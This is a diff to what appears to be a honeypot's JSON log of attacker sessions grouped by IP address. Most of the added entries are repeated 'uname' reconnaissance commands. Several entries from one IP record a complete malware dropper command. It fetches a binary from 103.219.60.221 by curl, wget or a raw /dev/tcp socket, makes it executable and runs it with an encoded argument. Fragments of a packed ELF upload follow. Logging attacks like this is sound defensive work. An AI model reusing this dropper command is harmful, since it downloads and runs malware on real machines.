@@ -3703,6 +3703,36 @@
             "event": "command_input",
             "input": "uname -s -v -n -r -m",
             "session": "2fbf9fe5680f"
+        },
+        {
+            "timestamp": "2023-11-14T20:13:12.456532Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "f131808ad915"
+        },
+        {
+            "timestamp": "2023-11-14T20:18:16.998895Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "5f65c7bf4733"
+        },
+        {
+            "timestamp": "2023-11-14T20:28:26.567863Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "ffed31a50534"
+        },
+        {
+            "timestamp": "2023-11-14T20:33:31.192007Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "06c82478fc8c"
+        },
+        {
+            "timestamp": "2023-11-14T21:04:02.643111Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "e3bd77af3c59"
         }
     ],
     "58.51.121.91": [
@@ -3743,6 +3773,38 @@
             "event": "file_download",
             "details": "File downloaded: /root/.ssh/authorized_keys (SHA-256: a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2)",
             "session": "aef9b0462936"
+        }
+    ],
+    "43.155.178.78": [
+        {
+            "timestamp": "2023-11-14T20:40:53.509850Z",
+            "event": "command_input",
+            "input": "echo 1 && cat /bin/echo",
+            "session": "5563b4404489"
+        },
+        {
+            "timestamp": "2023-11-14T20:40:59.775653Z",
+            "event": "command_input",
+            "input": "nohup $SHELL -c \"curl http://103.219.60.221:60146/linux -o /tmp/YVSaWjivRT; if [ ! -f /tmp/YVSaWjivRT ]; then wget http://103.219.60.221:60146/linux -O /tmp/YVSaWjivRT; fi; if [ ! -f /tmp/YVSaWjivRT ]; then exec 6<>/dev/tcp/103.219.60.221/60146 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/YVSaWjivRT && chmod +x /tmp/YVSaWjivRT && /tmp/YVSaWjivRT qE3BA7YxqwHbX9fQQ8QAqTquAMRf1cVcxQO2MqkJ21vVy1/HAaI2qAHBW8XRXtsBqzK2AcBdy9RVwQquMKkDwU3U0FTbBq0urQTbX9fWV8MAqTCsEMRc1MtZzR6pMK8ex1fT1VzGBbgxqgDbX9DLX8QCtjGtAM9b1dRfxBCpOawexFrSy17EHqkzqgrDXdTRWdUBqTG2AsZdy9Rcwx6qMagKw13U1VjVAaoytgLHW8vRVNsCqDKiBsVc1dZNxACuLqkE21/R3UPEAKI2qAHBXsXUVdsBoDO2AcBD3d1XwwCpMKsQxF3Wy1/ECbY2qB7HX9TfW8UBrDa4BMxD19Zf2wKpMbYCx13f013EAqogqQfAQ9TQWNsDrS6uB89b1dRZwBCsN7YJwUPU0UPEAak6rgDEXNLFXsweqTCtHsdc3MtcxQmiNqgBxl3F1FXFHqk4qB7HWdzLWcAKrjCpA81N1NdZ2wKqMrYBwVrL0FrPBqgxqwjVXNTSQ8QFry6pCcJD19dXwwCpMqEQwV7L1FjAHqk3oB7CVd/TXcQBrSCqAsRD1NBd2wKpNLYCwVrf013EAKEgqQDDQ9TXQ8QAry6pAcFX09VcxQO4Ma0G21/W10PEALYxoADPW9XUWcEQqTCpHsdd1ctYzB6pNawKw13U11TVBKsuqQXAQ9TdXtsDqTquAMRZ3MVZwh6pMKEex1/L1F3NCq4wqQPDTdTXXNsBoTa2AcxZy9RUxAquMKkAw03Q10PEB68uqQjCQ9fVWs8GqDGrAtVZ3MtfxgK2MqkB21/X1VfDAKkyqhDEWtDLXMAFtjOtHsNa39NdxAStNXA7+PWPbcjOHdBmbQ==; fi; echo 12345678 > /tmp/.opass; chmod +x /tmp/YVSaWjivRT && /tmp/YVSaWjivRT qE3BA7YxqwHbX9fQQ8QAqTquAMRf1cVcxQO2MqkJ21vVy1/HAaI2qAHBW8XRXtsBqzK2AcBdy9RVwQquMKkDwU3U0FTbBq0urQTbX9fWV8MAqTCsEMRc1MtZzR6pMK8ex1fT1VzGBbgxqgDbX9DLX8QCtjGtAM9b1dRfxBCpOawexFrSy17EHqkzqgrDXdTRWdUBqTG2AsZdy9Rcwx6qMagKw13U1VjVAaoytgLHW8vRVNsCqDKiBsVc1dZNxACuLqkE21/R3UPEAKI2qAHBXsXUVdsBoDO2AcBD3d1XwwCpMKsQxF3Wy1/ECbY2qB7HX9TfW8UBrDa4BMxD19Zf2wKpMbYCx13f013EAqogqQfAQ9TQWNsDrS6uB89b1dRZwBCsN7YJwUPU0UPEAak6rgDEXNLFXsweqTCtHsdc3MtcxQmiNqgBxl3F1FXFHqk4qB7HWdzLWcAKrjCpA81N1NdZ2wKqMrYBwVrL0FrPBqgxqwjVXNTSQ8QFry6pCcJD19dXwwCpMqEQwV7L1FjAHqk3oB7CVd/TXcQBrSCqAsRD1NBd2wKpNLYCwVrf013EAKEgqQDDQ9TXQ8QAry6pAcFX09VcxQO4Ma0G21/W10PEALYxoADPW9XUWcEQqTCpHsdd1ctYzB6pNawKw13U11TVBKsuqQXAQ9TdXtsDqTquAMRZ3MVZwh6pMKEex1/L1F3NCq4wqQPDTdTXXNsBoTa2AcxZy9RUxAquMKkAw03Q10PEB68uqQjCQ9fVWs8GqDGrAtVZ3MtfxgK2MqkB21/X1VfDAKkyqhDEWtDLXMAFtjOtHsNa39NdxAStNXA7+PWPbcjOHdBmbQ==\" &",
+            "session": "5563b4404489"
+        },
+        {
+            "timestamp": "2023-11-14T20:40:59.778766Z",
+            "event": "command_input",
+            "input": "head -c 2386472 > /tmp/a4dPmxjt3Z",
+            "session": "5563b4404489"
+        },
+        {
+            "timestamp": "2023-11-14T20:40:59.960009Z",
+            "event": "command_input",
+            "input": "nohup $SHELL -c \"curl http://103.219.60.221:60146/linux -o /tmp/YVSaWjivRT; if [ ! -f /tmp/YVSaWjivRT ]; then wget http://103.219.60.221:60146/linux -O /tmp/YVSaWjivRT; fi; if [ ! -f /tmp/YVSaWjivRT ]; then exec 6<>/dev/tcp/103.219.60.221/60146 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/YVSaWjivRT && chmod +x /tmp/YVSaWjivRT && /tmp/YVSaWjivRT qE3BA7YxqwHbX9fQQ8QAqTquAMRf1cVcxQO2MqkJ21vVy1/HAaI2qAHBW8XRXtsBqzK2AcBdy9RVwQquMKkDwU3U0FTbBq0urQTbX9fWV8MAqTCsEMRc1MtZzR6pMK8ex1fT1VzGBbgxqgDbX9DLX8QCtjGtAM9b1dRfxBCpOawexFrSy17EHqkzqgrDXdTRWdUBqTG2AsZdy9Rcwx6qMagKw13U1VjVAaoytgLHW8vRVNsCqDKiBsVc1dZNxACuLqkE21/R3UPEAKI2qAHBXsXUVdsBoDO2AcBD3d1XwwCpMKsQxF3Wy1/ECbY2qB7HX9TfW8UBrDa4BMxD19Zf2wKpMbYCx13f013EAqogqQfAQ9TQWNsDrS6uB89b1dRZwBCsN7YJwUPU0UPEAak6rgDEXNLFXsweqTCtHsdc3MtcxQmiNqgBxl3F1FXFHqk4qB7HWdzLWcAKrjCpA81N1NdZ2wKqMrYBwVrL0FrPBqgxqwjVXNTSQ8QFry6pCcJD19dXwwCpMqEQwV7L1FjAHqk3oB7CVd/TXcQBrSCqAsRD1NBd2wKpNLYCwVrf013EAKEgqQDDQ9TXQ8QAry6pAcFX09VcxQO4Ma0G21/W10PEALYxoADPW9XUWcEQqTCpHsdd1ctYzB6pNawKw13U11TVBKsuqQXAQ9TdXtsDqTquAMRZ3MVZwh6pMKEex1/L1F3NCq4wqQPDTdTXXNsBoTa2AcxZy9RUxAquMKkAw03Q10PEB68uqQjCQ9fVWs8GqDGrAtVZ3MtfxgK2MqkB21/X1VfDAKkyqhDEWtDLXMAFtjOtHsNa39NdxAStNXA7+PWPbcjOHdBmbQ==; fi; echo 12345678 > /tmp/.opass; chmod +x /tmp/YVSaWjivRT && /tmp/YVSaWjivRT qE3BA7YxqwHbX9fQQ8QAqTquAMRf1cVcxQO2MqkJ21vVy1/HAaI2qAHBW8XRXtsBqzK2AcBdy9RVwQquMKkDwU3U0FTbBq0urQTbX9fWV8MAqTCsEMRc1MtZzR6pMK8ex1fT1VzGBbgxqgDbX9DLX8QCtjGtAM9b1dRfxBCpOawexFrSy17EHqkzqgrDXdTRWdUBqTG2AsZdy9Rcwx6qMagKw13U1VjVAaoytgLHW8vRVNsCqDKiBsVc1dZNxACuLqkE21/R3UPEAKI2qAHBXsXUVdsBoDO2AcBD3d1XwwCpMKsQxF3Wy1/ECbY2qB7HX9TfW8UBrDa4BMxD19Zf2wKpMbYCx13f013EAqogqQfAQ9TQWNsDrS6uB89b1dRZwBCsN7YJwUPU0UPEAak6rgDEXNLFXsweqTCtHsdc3MtcxQmiNqgBxl3F1FXFHqk4qB7HWdzLWcAKrjCpA81N1NdZ2wKqMrYBwVrL0FrPBqgxqwjVXNTSQ8QFry6pCcJD19dXwwCpMqEQwV7L1FjAHqk3oB7CVd/TXcQBrSCqAsRD1NBd2wKpNLYCwVrf013EAKEgqQDDQ9TXQ8QAry6pAcFX09VcxQO4Ma0G21/W10PEALYxoADPW9XUWcEQqTCpHsdd1ctYzB6pNawKw13U11TVBKsuqQXAQ9TdXtsDqTquAMRZ3MVZwh6pMKEex1/L1F3NCq4wqQPDTdTXXNsBoTa2AcxZy9RUxAquMKkAw03Q10PEB68uqQjCQ9fVWs8GqDGrAtVZ3MtfxgK2MqkB21/X1VfDAKkyqhDEWtDLXMAFtjOtHsNa39NdxAStNXA7+PWPbcjOHdBmbQ==\" &#UPX!",
+            "session": "5563b4404489"
+        },
+        {
+            "timestamp": "2023-11-14T20:40:59.965444Z",
+            "event": "command_input",
+            "input": ">A@/ X'8ELFXLL",
+            "session": "5563b4404489"
         }
     ],
     "189.112.0.11": [
